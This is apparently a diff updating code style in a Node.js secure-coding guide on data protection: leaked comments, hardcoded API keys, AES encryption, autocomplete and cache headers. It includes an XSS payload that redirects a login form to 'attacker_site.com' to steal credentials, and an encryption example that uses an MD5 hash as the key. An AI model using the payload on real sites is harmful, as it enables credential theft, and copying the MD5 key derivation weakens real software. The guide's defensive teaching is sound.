@@ -43,7 +43,7 @@ Sometimes developers leave comments like _To-do lists_ in the source-code, and
 sometimes, in the worst case scenario, developers may leave credentials.
 
 ```javascript
-// Secret API endpoint - /api/mytoken?callback=myToken
+// secret API endpoint - /api/mytoken?callback=myToken
 console.log("Just a random code")
 ```
 
@@ -63,21 +63,21 @@ application vulnerable because:
 ```JavaScript
 const http = require('http');
 
-var options = {
+const options = {
   host: 'www.mycompany.com',
   path: '/api/mytoken?api_key=000s3cr3t000'
 };
 
-callback = function(response) {
-  var str = '';
+const callback = (response) => {
+  let str = '';
 
-  //another chunk of data has been recieved, so append it to `str`
-  response.on('data', function (chunk) {
+  // another chunk of data has been recieved, so append it to `str`
+  response.on('data', (chunk) => {
     str += chunk;
   });
 
-  //the whole response has been recieved, so we just print it out here
-  response.on('end', function () {
+  // the whole response has been recieved, so we just print it out here
+  response.on('end', () => {
     console.log(str);
   });
 }
@@ -137,26 +137,24 @@ A small example of `aes-256-cbc` encryption in Node.js using the
 `crypto` module:
 
 ```javascript
-'use strict';
-
 const crypto = require('crypto');
 
 // get password's md5 hash
-let password = 'test';
-let password_hash = crypto.createHash('md5').update(password, 'utf-8').digest('hex').toUpperCase();
+const password = 'test';
+const password_hash = crypto.createHash('md5').update(password, 'utf-8').digest('hex').toUpperCase();
 console.log('key=', password_hash); // 098F6BCD4621D373CADE4E832627B4F6
 
 // our data to encrypt
-let data = 'Sample text to encrypt';
+const data = 'Sample text to encrypt';
 console.log('data=', data);
 
 // generate random initialization vector
-var iv = crypto.randomBytes(16)
+const iv = crypto.randomBytes(16)
 console.log('iv=', iv);
 
 // encrypt data
-let cipher = crypto.createCipheriv('aes-256-cbc', password_hash, iv);
-let encryptedData = cipher.update(data, 'utf8', 'hex') + cipher.final('hex');
+const cipher = crypto.createCipheriv('aes-256-cbc', password_hash, iv);
+const encryptedData = cipher.update(data, 'utf8', 'hex') + cipher.final('hex');
 console.log('encrypted data=', encryptedData.toUpperCase());
 ```
 
@@ -193,8 +191,8 @@ This is especially useful for disabling `autocomplete` on login forms. Imagine a
 case where a Cross-Site Scripting vector is present in the login page.
 If the malicious user creates a payload like:
 
-```JavaScript
-window.setTimeout(function() {
+```javascript
+window.setTimeout(() => {
   document.forms[0].action = 'http://attacker_site.com';
   document.forms[0].submit();
 }
@@ -210,17 +208,21 @@ Cache control in pages that contain sensitive information should be disabled.
 This can be achieved by setting the corresponding header flags.   
 The following snippet shows how to do this in an `express` application:
 
-```JavaScript
-//Express application
-[...]
+```javascript
+const express = require('express');
 
-app.use(function (req,res,next){
-  res.header('Cache-Control', 'private, no-cache, no-store, must-revalidate')
-  res.header('Pragma', 'no-cache')
-  next()
+const app = express();
+
+// ...
+
+app.use((req,res,next) => {
+  res.header('Cache-Control', 'private, no-cache, no-store, must-revalidate');
+  res.header('Pragma', 'no-cache');
+
+  next();
 });
 
-[...]
+// ...
 ```
 
 The `no-cache` value tells the browser to revalidate with the server before
